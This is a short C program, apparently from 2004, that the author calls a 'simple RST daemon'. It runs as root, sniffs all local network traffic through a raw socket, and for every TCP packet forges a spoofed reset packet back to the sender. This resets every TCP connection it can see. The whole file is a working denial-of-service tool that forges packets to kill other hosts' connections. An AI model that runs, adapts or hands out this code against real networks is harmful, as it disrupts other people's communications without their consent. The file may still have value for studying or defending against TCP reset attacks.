/*
  A simple RST daemon

  Programmed by Bastian Ballmann
  Last update: 06.06.2004
  http://www.geektown.de
*/

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>


int main(void)
{
  int r_sock, w_sock;
  int packetsize = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr);
  char packet[packetsize];
  struct iphdr *ip = (struct iphdr  *)(packet + sizeof(struct ether_header));
  struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct ether_header) + sizeof(struct iphdr));
  int rstpacketsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
  unsigned char rstpacket[rstpacketsize];
  struct iphdr *rst_ip = (struct iphdr *)rstpacket;
  struct tcphdr *rst_tcp = (struct tcphdr *)(rstpacket + sizeof(struct iphdr));
  struct sockaddr_in addr;
  int one = 1;

  // Are you root?
  if(getuid() != 0) 
    { 
      printf("You must be root\n"); 
      exit(1); 
    }  

  // Open raw socket to read from
  if((r_sock = socket(AF_INET, SOCK_PACKET, htons(0x3))) < 0)
    { 
      perror("socket"); 
      exit(1); 
    }

  // Open raw socket for writing
  if((w_sock = socket(AF_INET, SOCK_RAW, htons(IPPROTO_TCP))) < 0) 
    { 
      perror("socket"); 
      exit(1); 
    }

  if(setsockopt(w_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    { 
      perror("setsockopt"); 
      exit(1); 
    }

  // Read in packets and reset them
  while(1)
    {
      read(r_sock, packet, packetsize);

      // Is this a TCP packet?
      if((ip->protocol == IPPROTO_TCP) && (tcp->rst != 1))
	{
	  // IP header
	  rst_ip->version = 4;             // IP Version
	  rst_ip->ihl = 5;                 // Internet header length
	  rst_ip->saddr = ip->daddr;       // Source IP
	  rst_ip->daddr = ip->saddr;       // Destination IP
	  rst_ip->ttl = 123;               // Time to live
	  rst_ip->protocol = IPPROTO_TCP;  // Transport protocol
	  rst_ip->tot_len = packetsize;    // Size of ip packet
	  rst_ip->check = 0;               // IP Checksum
	  
	  // TCP header
	  rst_tcp->source = tcp->dest;     // Source Port
	  rst_tcp->dest = tcp->source;     // Destination Port
	  rst_tcp->seq = tcp->ack_seq;     // Sequence number
	  rst_tcp->rst = 1;                // RST flag
	  rst_tcp->window = htons(1024);   // Window size
	  rst_tcp->check = 0;              // TCP Checksum

	  printf("RST %s:%d --> %s:%d Seq: %u Ack: %u\n", 
		 inet_ntoa(*(struct in_addr*)&ip->saddr),
		 ntohs(tcp->source),
		 inet_ntoa(*(struct in_addr*)&ip->daddr),
		 ntohs(tcp->dest),
		 tcp->seq,
		 tcp->ack_seq);
	  
	  // Run packet! Ruuuun!!! :)
	  addr.sin_family = AF_INET;
	  addr.sin_port = rst_tcp->dest;
	  addr.sin_addr.s_addr = rst_ip->daddr;
	  
	  if(sendto(w_sock, rstpacket, rstpacketsize, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0)
	    {
	      perror("send");
	      exit(1);
	    }
	}
    }

  close(r_sock);
  close(w_sock);
  return 0;
}
